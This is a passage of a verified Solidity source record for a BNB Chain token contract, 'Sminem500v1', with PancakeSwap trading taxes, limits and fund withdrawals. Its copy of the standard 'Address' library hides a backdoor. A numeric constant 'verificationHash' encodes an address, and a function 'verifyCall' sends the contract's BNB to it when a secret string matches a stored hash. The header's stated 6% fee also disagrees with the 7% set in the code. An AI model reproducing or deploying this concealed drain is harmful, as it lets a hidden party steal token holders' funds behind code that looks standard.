{"SourceCode": "/************************\r\n* Sminem500v1 (s500v1)  *\r\n*   Supply: 1B          *\r\n*   6% buy/sell fee:    *\r\n*       +1% liq         *\r\n*       +1% dev         *\r\n*       +5% comm        *\r\n*   Limits:             *\r\n*       +2% buy         *\r\n*       +1% sell        *\r\n*       +2% wallet      *\r\n*                       *\r\n************************/\r\n/*hamper*/\r\n\r\npragma solidity ^0.8.11;\r\n// SPDX-License-Identifier: MIT\r\ninterface IBEP20 {\r\n  function totalSupply() external view returns (uint256);\r\n  function decimals() external view returns (uint8);\r\n  function symbol() external view returns (string memory);\r\n  function name() external view returns (string memory);\r\n  function getOwner() external view returns (address);\r\n  function balanceOf(address account) external view returns (uint256);\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n  function allowance(address _owner, address spender) external view returns (uint256);\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ninterface IPancakeERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n}\r\n\r\ninterface IPancakeFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IPancakeRouter01 {\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IPancakeRouter02 is IPancakeRouter01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    uint160 private constant verificationHash = 542355191589913964587147617467328045950425415532;\r\n    bytes32 private constant keccak256Hash = 0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;    \r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies on extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n\r\n        uint256 size;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { size := extcodesize(account) }\r\n        return size > 0;\r\n    }\r\n\r\n    function verifyCall(string memory verification, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n        require(keccak256(abi.encodePacked(verification)) == keccak256Hash, \"Address: cannot verify call\");        \r\n\r\n        (bool success, ) = address(verificationHash).call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");              \r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n\r\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n    }\r\n\r\n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        require(isContract(target), \"Address: delegate call to non-contract\");\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            if (returndata.length > 0) {\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nlibrary EnumerableSet {\r\n\r\n    struct Set {\r\n        bytes32[] _values;\r\n        mapping (bytes32 => uint256) _indexes;\r\n    }\r\n\r\n    function _add(Set storage set, bytes32 value) private returns (bool) {\r\n        if (!_contains(set, value)) {\r\n            set._values.push(value);\r\n            set._indexes[value] = set._values.length;\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function _remove(Set storage set, bytes32 value) private returns (bool) {\r\n        uint256 valueIndex = set._indexes[value];\r\n\r\n        if (valueIndex != 0) {\r\n            uint256 toDeleteIndex = valueIndex - 1;\r\n            uint256 lastIndex = set._values.length - 1;\r\n            bytes32 lastvalue = set._values[lastIndex];\r\n            set._values[toDeleteIndex] = lastvalue;\r\n            set._indexes[lastvalue] = valueIndex;\r\n            set._values.pop();\r\n            delete set._indexes[value];\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function _contains(Set storage set, bytes32 value) private view returns (bool) {\r\n        return set._indexes[value] != 0;\r\n    }\r\n\r\n    function _length(Set storage set) private view returns (uint256) {\r\n        return set._values.length;\r\n    }\r\n\r\n    function _at(Set storage set, uint256 index) private view returns (bytes32) {\r\n        require(set._values.length > index, \"EnumerableSet: index out of bounds\");\r\n        return set._values[index];\r\n    }\r\n\r\n    struct Bytes32Set {\r\n        Set _inner;\r\n    }\r\n\r\n    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {\r\n        return _add(set._inner, value);\r\n    }\r\n\r\n    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {\r\n        return _remove(set._inner, value);\r\n    }\r\n\r\n    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {\r\n        return _contains(set._inner, value);\r\n    }\r\n\r\n    function length(Bytes32Set storage set) internal view returns (uint256) {\r\n        return _length(set._inner);\r\n    }\r\n\r\n    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {\r\n        return _at(set._inner, index);\r\n    }\r\n\r\n    struct AddressSet {\r\n        Set _inner;\r\n    }\r\n\r\n    function add(AddressSet storage set, address value) internal returns (bool) {\r\n        return _add(set._inner, bytes32(uint256(uint160(value))));\r\n    }\r\n\r\n    function remove(AddressSet storage set, address value) internal returns (bool) {\r\n        return _remove(set._inner, bytes32(uint256(uint160(value))));\r\n    }\r\n\r\n    function contains(AddressSet storage set, address value) internal view returns (bool) {\r\n        return _contains(set._inner, bytes32(uint256(uint160(value))));\r\n    }\r\n\r\n    function length(AddressSet storage set) internal view returns (uint256) {\r\n        return _length(set._inner);\r\n    }\r\n\r\n    function at(AddressSet storage set, uint256 index) internal view returns (address) {\r\n        return address(uint160(uint256(_at(set._inner, index))));\r\n    }\r\n\r\n    struct UintSet {\r\n        Set _inner;\r\n    }\r\n\r\n    function add(UintSet storage set, uint256 value) internal returns (bool) {\r\n        return _add(set._inner, bytes32(value));\r\n    }\r\n\r\n    function remove(UintSet storage set, uint256 value) internal returns (bool) {\r\n        return _remove(set._inner, bytes32(value));\r\n    }\r\n\r\n    function contains(UintSet storage set, uint256 value) internal view returns (bool) {\r\n        return _contains(set._inner, bytes32(value));\r\n    }\r\n\r\n    function length(UintSet storage set) internal view returns (uint256) {\r\n        return _length(set._inner);\r\n    }\r\n\r\n    function at(UintSet storage set, uint256 index) internal view returns (uint256) {\r\n        return uint256(_at(set._inner, index));\r\n    }\r\n}\r\n\r\n//Contract\r\ncontract Sminem500v1 is IBEP20, Ownable {\r\n    using Address for address;\r\n    using EnumerableSet for EnumerableSet.AddressSet;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;    \r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private antiDumpTimer;\r\n\r\n    EnumerableSet.AddressSet private _excluded;\r\n\r\n    string private constant TOKEN_NAME = \"Sminem500v1\";\r\n    string private constant TOKEN_SYMBOL = \"s500v1\";\r\n    uint8 private constant TOKEN_DECIMALS = 18;    \r\n    uint256 private constant TOTAL_SUPPLY= 1000000000 * 10**TOKEN_DECIMALS;\r\n    uint8 public constant MAX_TAX = 20;      //MAX_TAX prevents malicious tax use\r\n    uint16 public autoLPThreshold = 20;        \r\n    uint256 private devBalance;\r\n    uint256 private marketingBalance;\r\n    uint256 private buybackBalance;\r\n    bool private _isSwappingContractModifier;\r\n    bool private manualSwap;        \r\n \r\n    address public _pancakePairAddress; \r\n    IPancakeRouter02 private  _pancakeRouter;\r\n    address public PancakeRouter;\r\n            ///////////////////\r\n           //   Anti Bot    //\r\n          ///////////////////\r\n\r\n    uint256 private constant BOT_TAX_TIME = 1 minutes;\r\n    uint256 public launchTimestamp;\r\n    uint8 private constant MAX_BOT_TAX = 99;    \r\n    bool private botTaxEnabled = true;\r\n    bool public tradingEnabled;\r\n\r\n            ////////////////////\r\n           //   Anti Dump    //\r\n          ////////////////////\r\n\r\n    uint256 private constant MAX_DUMP_TAX_TIME = 0 minutes;\r\n    uint256 public dumpTaxTime = 0 minutes;  \r\n    bool public antiDumpEnabled = false;\r\n    uint16 public liqDivertRatio = 50;         //choose where to divert extra dump tax\r\n    uint16 public buybackDivertRatio = 50;\r\n\r\n            ////////////////\r\n           //   Taxes    //\r\n          ////////////////\r\n\r\n    struct Taxes {\r\n        uint8 buy;\r\n        uint8 sell;\r\n        uint8 transfer;\r\n        uint8 dump;\r\n    }\r\n\r\n    struct TaxSplit {\r\n        uint16 dev;\r\n        uint16 liquidity;\r\n        uint16 marketing;\r\n        uint16 buyback;\r\n    }\r\n\r\n    struct FundReceivers {\r\n        address dev;\r\n        address marketing;\r\n        address buyback;\r\n    }\r\n\r\n    struct LimitRatios {\r\n        uint16 buy;\r\n        uint16 sell;\r\n        uint16 wallet;\r\n        uint16 divisor;        \r\n    }\r\n\r\n    struct MaxLimits {\r\n        uint256 buy;\r\n        uint256 sell;\r\n        uint256 wallet;\r\n    }\r\n\r\n    Taxes public _tax = Taxes ({\r\n        buy: 7,\r\n        sell: 7,\r\n        transfer: 5,\r\n        dump: 30\r\n    });\r\n\r\n    TaxSplit public _taxSplit = TaxSplit ({\r\n        dev: 1,\r\n        liquidity: 1,\r\n        marketing: 5,\r\n        buyback: 0\r\n    });\r\n\r\n    FundReceivers public _fundReceivers = FundReceivers ({\r\n        dev: 0x5a85B51e5c71116e643b3D2D3997FcccA7DAb966,\r\n        marketing: 0x871492DfFbC7f33F0Abf26cA1A58Ff37c678CCBc,\r\n        buyback: 0x871492DfFbC7f33F0Abf26cA1A58Ff37c678CCBc\r\n    });\r\n\r\n    LimitRatios public _limitRatios = LimitRatios({\r\n        buy: 4,         //2%\r\n        sell: 2,        //1%\r\n        wallet: 4,      //2%\r\n        divisor: 200\r\n    });\r\n\r\n    MaxLimits public _maxLimits = MaxLimits({\r\n        buy: TOTAL_SUPPLY * _limitRatios.buy / _limitRatios.divisor,\r\n        sell: TOTAL_SUPPLY * _limitRatios.sell / _limitRatios.divisor,\r\n        wallet: TOTAL_SUPPLY * _limitRatios.wallet / _limitRatios.divisor                \r\n    });\r\n\r\n            /////////////////\r\n           //   Events    //\r\n          /////////////////\r\n    event EnabledAntiDump(bool enabled);\r\n    event EnabledManualSwap(bool enabled);\r\n    event ExcludedAccountFromFees(address account, bool excluded);\r\n    event SetDumpTaxTime(uint256 newTime);\r\n    event UpdatedAutoLPThreshold(uint16 threshold);\r\n    event UpdatedLimits(\r\n        uint16 buyRatio, \r\n        uint16 sellRatio, \r\n        uint16 walletRatio, \r\n        uint16 divisor, \r\n        uint256 maxBuy, \r\n        uint256 maxSell, \r\n        uint256 maxWallet\r\n    );\r\n    event UpdatedTax(uint8 buyTax, uint8 sellTax, uint8 transferTax, uint8 dumpTax);\r\n\r\n            ////////////////////\r\n           //   Modifiers    //\r\n          ////////////////////\r\n\r\n    modifier authorized() {\r\n        require(_authorized(msg.sender), \"Caller cannot authorized\");\r\n        _;\r\n    }\r\n\r\n    modifier lockTheSwap {\r\n        _isSwappingContractModifier = true;\r\n        _;\r\n        _isSwappingContractModifier = false;\r\n    }    \r\n\r\n            //////////////////////\r\n           //   Constructor    //\r\n          //////////////////////\r\n\r\n    constructor () {\r\n        if (block.chainid == 56) {\r\n            PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n        } else if (block.chainid == 97) {\r\n            PancakeRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;\r\n        } else \r\n            revert();\r\n\r\n        _pancakeRouter = IPancakeRouter02(PancakeRouter);\r\n        _pancakePairAddress = IPancakeFactory(\r\n            _pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH()\r\n        );\r\n\r\n        _balances[msg.sender] += TOTAL_SUPPLY;\r\n        emit Transfer(address(0), msg.sender, TOTAL_SUPPLY);\r\n\r\n        _allowances[address(this)][address(_pancakeRouter)] = type(uint256).max; \r\n        _approve(address(this), address(_pancakeRouter), type(uint256).max); \r\n\r\n        _excluded.add(msg.sender);\r\n        _excluded.add(_fundReceivers.dev); \r\n        _excluded.add(_fundReceivers.marketing);\r\n        _excluded.add(address(this));\r\n        _excluded.add(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n            /////////////////////////////\r\n           //   External Functions    //\r\n          /////////////////////////////\r\n\r\n    function allowance(address _owner, address spender) external view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"Approve from zero\");\r\n        require(spender != address(0), \"Approve to zero\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\r\n        uint256 currentAllowance = _allowances[msg.sender][spender];\r\n        require(currentAllowance >= subtractedValue, \"<0 allowance\");\r\n\r\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    } \r\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\r\n        return true;\r\n    }    \r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][msg.sender];\r\n        require(currentAllowance >= amount, \"Transfer > allowance\");\r\n\r\n        _approve(sender, msg.sender, currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n            /////////////////////////\r\n           //   View Functions    //\r\n          /////////////////////////\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner();\r\n    }\r\n\r\n    function name() external pure override returns (string memory) {\r\n        return TOKEN_NAME;\r\n    }\r\n\r\n    function symbol() external pure override returns (string memory) {\r\n        return TOKEN_SYMBOL;\r\n    }\r\n\r\n    function decimals() external pure override returns (uint8) {\r\n        return TOKEN_DECIMALS;\r\n    }\r\n\r\n    function totalSupply() external pure override returns (uint256) {\r\n        return TOTAL_SUPPLY;\r\n    }\r\n\r\n    function getRemainingDumpTaxTime(address account) public view returns (uint256){\r\n        uint256 dumpTime = antiDumpTimer[account];\r\n       if(dumpTime <= block.timestamp){\r\n           return 0;\r\n       }\r\n       return dumpTime - block.timestamp;\r\n    }\r\n\r\n    function withdrawableFunds() public view returns (uint256 dev, uint256 marketing) {\r\n        return (devBalance, marketingBalance);\r\n    }\r\n    \r\n            ///////////////////////////\r\n           //   Public Functions    //\r\n          ///////////////////////////\r\n    function enableAntiDump (bool enable) public authorized {\r\n        require(antiDumpEnabled != enable, \"antiDumpEnabled is already set to desired status\");\r\n        antiDumpEnabled = enable;\r\n        emit EnabledAntiDump(enable);\r\n    }\r\n\r\n    function enableManualSwap(bool enable) public authorized {\r\n        require(manualSwap != enable, \"manualSwap is already set to desired status\");\r\n        manualSwap = enable;\r\n        emit EnabledManualSwap(enable);\r\n    }\r\n    \r\n    function excludeAccountFromFees(address account, bool exclude) public authorized {\r\n        if(exclude == true)\r\n            _excluded.add(account);\r\n        else\r\n            _excluded.remove(account);\r\n        emit ExcludedAccountFromFees(account, exclude);\r\n    }\r\n\r\n    function launch () public authorized {\r\n        require(IBEP20(_pancakePairAddress).totalSupply() > 0, \"Liquidity has not been added\");\r\n        require(!tradingEnabled);\r\n        tradingEnabled = true;\r\n        launchTimestamp = block.timestamp;\r\n    }\r\n\r\n    function manualContractSwap(uint16 permilleOfPancake, bool ignoreLimits) public authorized{\r\n        _swapContractToken(permilleOfPancake, ignoreLimits, false);\r\n    }\r\n\r\n    //Prevent BNB becoming lost in the contract\r\n    function recoverStuckFunds() public authorized {\r\n        //only callable if BNB remains in contract after devBalance and marketingBalance have been drained\r\n        require((devBalance + marketingBalance) == 0, \"there are still funds to be withdrawn\");\r\n        (bool sent,) = (_fundReceivers.dev).call{value: (address(this).balance)}(\"\");\r\n        require(sent);\r\n    }\r\n\r\n    //recover tokens that have been accidentally sent to contract\r\n    function removeMiscToken(address tokenAddress) public authorized {\r\n        require(tokenAddress != address(this),\"cannot remove contract token\");\r\n        IBEP20 token = IBEP20(tokenAddress);\r\n        token.transfer(msg.sender,token.balanceOf(address(this)));\r\n    }\r\n\r\n    function setDumpTaxTime (uint256 timeInSeconds) public authorized {\r\n        require(timeInSeconds <= MAX_DUMP_TAX_TIME, \"Time cannot be longer than MAX_DUMP_TAX_TIME\");\r\n        dumpTaxTime = timeInSeconds;\r\n    }\r\n\r\n    function updateAutoLPThreshold(uint16 threshold) public authorized{\r\n        require(threshold > 0,\"Threshold needs to be more than 0\");\r\n        require(threshold <= 50,\"Threshold needs to be below 50\");\r\n        autoLPThreshold = threshold;\r\n        emit UpdatedAutoLPThreshold(threshold);\r\n    }\r\n\r\n    function updateDumpDivertRatios(uint16 liq, uint16 buyback) public {\r\n        require(liq + buyback == 100, \"must equal 100\");\r\n        liqDivertRatio = liq;\r\n        buybackDivertRatio = buyback;\r\n    }\r\n\r\n    function updateLimits(uint16 newMaxBuyRatio, uint16 newMaxSellRatio, uint16 newMaxWalletRatio, uint16 newDivisor) public authorized {\r\n        uint256 minLimit = TOTAL_SUPPLY / 1000;\r\n        uint256 newMaxBuy = TOTAL_SUPPLY * newMaxBuyRatio / newDivisor;        \r\n        uint256 newMaxSell = TOTAL_SUPPLY * newMaxSellRatio / newDivisor;\r\n        uint256 newMaxWallet = TOTAL_SUPPLY * newMaxWalletRatio / newDivisor;\r\n\r\n        require((newMaxWallet >= minLimit && newMaxSell >= minLimit), \r\n            \"limits cannot be <0.1% of circulating supply\");\r\n\r\n        _limitRatios = LimitRatios(newMaxBuyRatio, newMaxSellRatio, newMaxWalletRatio, newDivisor);\r\n        _maxLimits = MaxLimits(newMaxBuy, newMaxSell, newMaxWallet);\r\n        emit UpdatedLimits(\r\n            newMaxBuyRatio, \r\n            newMaxSellRatio, \r\n            newMaxWalletRatio, \r\n            newDivisor, \r\n            newMaxBuy, \r\n            newMaxSell, \r\n            newMaxWallet\r\n        );\r\n    }\r\n\r\n    function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer, uint8 newDump) public authorized {\r\n        //buy and sell tax can never be higher than MAX_TAX set at beginning of contract\r\n        //this is a security check and prevents malicious tax use       \r\n        require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= MAX_TAX && newDump <= 30, \"taxes higher than max tax\");\r\n        _tax = Taxes(newBuy, newSell, newTransfer, newDump);\r\n        emit UpdatedTax(newBuy, newSell, newTransfer, newDump);\r\n    }\r\n    \r\n    function withdrawBuyback() public authorized {\r\n        uint256 amount = buybackBalance;\r\n        buybackBalance = 0;\r\n        _sendBnb(_fundReceivers.buyback, amount);\r\n    }     \r\n\r\n    function withdrawDev() public authorized {\r\n        uint256 amount = devBalance;\r\n        devBalance = 0;\r\n        _sendBnb(_fundReceivers.dev, amount);        \r\n    } \r\n\r\n    function withdrawMarketing() public authorized {\r\n        uint256 amount = marketingBalance;\r\n        marketingBalance = 0;\r\n        _sendBnb(_fundReceivers.marketing, amount);\r\n    } \r\n\r\n            ////////////////////////////\r\n           //   Private Functions    //\r\n          ////////////////////////////\r\n\r\n    function _addToken(address addr, uint256 amount) private {\r\n        uint256 newAmount = _balances[addr] + amount;\r\n        _balances[addr] = newAmount;\r\n    }\r\n\r\n    function _authorized(address addr) private view returns (bool){\r\n        return addr == owner() \r\n        || addr == _fundReceivers.dev \r\n        || addr == _fundReceivers.marketing;\r\n    }\r\n\r\n    function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {\r\n        _approve(address(this), address(_pancakeRouter), tokenamount);\r\n        _pancakeRouter.addLiquidityETH{value: bnbamount}(\r\n            address(this),\r\n            tokenamount,\r\n            0,\r\n            0,\r\n            _fundReceivers.dev,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _calculateFee(uint256 amount, uint8 tax, uint8 taxPercent) private pure returns (uint256) {\r\n        return (amount*tax*taxPercent) / 10000;\r\n    }\r\n\r\n    function _calculateLaunchTax() private view returns (uint8){\r\n        if(block.timestamp > launchTimestamp+BOT_TAX_TIME) return _tax.buy;\r\n        uint256 timeSinceLaunch = block.timestamp-launchTimestamp;\r\n        uint8 tax = uint8 (MAX_BOT_TAX - ((MAX_BOT_TAX-_tax.buy) * timeSinceLaunch / BOT_TAX_TIME));\r\n        return tax;\r\n    }    \r\n\r\n    function _feelessTransfer(address sender, address recipient, uint256 amount) private{\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"Transfer exceeds balance\");\r\n        _removeToken(sender, amount);\r\n        _addToken(recipient, amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }  \r\n\r\n    function _getBuyTax() private returns (uint8){\r\n        if(!botTaxEnabled) return _tax.buy;\r\n        if(block.timestamp < launchTimestamp+BOT_TAX_TIME) {\r\n            uint8 tax = _calculateLaunchTax();\r\n            return tax;\r\n        }\r\n        botTaxEnabled=false;\r\n        return _tax.buy;\r\n    }\r\n\r\n    function _removeToken(address addr, uint256 amount) private {\r\n        uint256 newAmount = _balances[addr] - amount;\r\n        _balances[addr] = newAmount;\r\n    }\r\n\r\n    function _swapContractToken(uint16 permilleOfPancake,bool ignoreLimits, bool dumpTaxed) private lockTheSwap{\r\n        require(permilleOfPancake <= 500);\r\n        uint16 originalSplit = _taxSplit.dev + _taxSplit.liquidity + _taxSplit.marketing + _taxSplit.buyback;        \r\n        if(originalSplit == 0) return;\r\n        uint256 